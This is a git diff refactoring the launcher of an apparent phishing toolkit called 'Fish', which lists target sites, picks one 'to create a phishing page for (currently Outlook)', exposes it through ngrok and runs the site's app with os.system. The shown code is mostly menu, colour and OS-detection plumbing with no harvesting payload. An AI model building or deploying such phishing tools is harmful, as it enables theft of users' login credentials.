@@ -6,7 +6,7 @@ from os import system
 from sys import platform
 from threading import Thread
 from sites import siteLookUp
-
+import utils
 
 
 # Want to contribute? Make a fork and a pull request to the dev branch! I made the logo on placeit and converted into using https://www.text-image.com/convert/ascii.html. Thanks!! please star
@@ -59,36 +59,14 @@ ascii = """
 [[y]] Made by aarav2you
 [[y]] Made by Kritagyaispro
 
-[[c-bg]]_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.- [[:: FISH ::]] '~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~"""
+[[c-bg]]_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.- [[:: FISH ::]] '~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~
 
-
+        """
                                     ############################################################# Parameters and configuration #############################################################
 # We aren't responsible for anything you decide to do. This is only for education purposes.
 
 #### Initializes colorama
 colorama.init(autoreset=True)
-
-#### A list that sest long non-sensical ANSI characters to short synonyms
-COLORS = {
-    "blu": "\u001b[34;1m",
-    "r": "\u001b[31;1m",
-    "g": "\u001b[32m",
-    "y": "\u001b[33;1m",
-    "b": "\u001b[30;1m",
-    "m": "\u001b[35m",
-    "c": "\u001b[36m",
-    "w": "\u001b[37m",
-    "y-bg": "\u001b[43m",
-    "b-bg": "\u001b[40m",
-    "c-bg": "\u001b[46;1m",
-}
-
-
-#### All the colors must be prefixed and suffixed with a "[[" "color" "]]"
-def colorText(text):
-    for color in COLORS:
-        text = text.replace("[[" + color + "]]", COLORS[color])
-    return text
 
 
 #### Tells ngrok to run on the port
@@ -97,26 +75,22 @@ def start_ngrok(port):
 
 
 #### Detects the Operating System
-Unix = False
-Windows = False
-
 if platform == "linux" or platform == "linux2" or platform == "darwin":
-    Unix = True
+    from commands import unixCommands as commands
 elif platform == "win32":
-    Windows = True
+    from commands import windowsCommands as commands
 else:
-    print("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
-    exit()
+    raise LookupError("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
 
 #### Clears the console and prints the ASCII art
-os.system("clear") if Unix == True else os.system("cls")
-print(colorText(ascii))
+os.system(commands.clear)
+print(utils.color.colorText(ascii))
 
                                     ############################################################# Questions/ Input #############################################################
 #### Prints options
 for site in siteLookUp:
     print('\n' + Fore.RED + "[" + Fore.CYAN + str(site) + Fore.RED + "]" + Fore.BLUE + f" {siteLookUp[site]}")
-print("\n\n")
+
 #### Selects the site to create a phishing page for (currently Outlook)
 site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: ") or 1)
 
@@ -141,14 +115,11 @@ def exec(site):
         siteName = siteLookUp[site]
     except KeyError:
         raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title")
-    if Unix == True:
-        # Change python version here if you want
-        os.system(f"clear && python Sites/{siteName}/app.py {redirect_url} {host} {port}")
-        # Change python version here if you want
-    elif Windows == True:
-        os.system(f"cls && python Sites\\{siteName}\\app.py {redirect_url} {host} {port}")
-    else:
-        raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")
+    # Change python version here if you want
+    #we use this instead of a string to be more portable and prevent errors and issues
+    path = os.path.join('Sites', siteName, "app.py")
+    #we need error handling here possibly
+    os.system(f"{commands.clear} && python {path} {redirect_url} {host} {port}")
 
 
 #### Deploys/starts the server
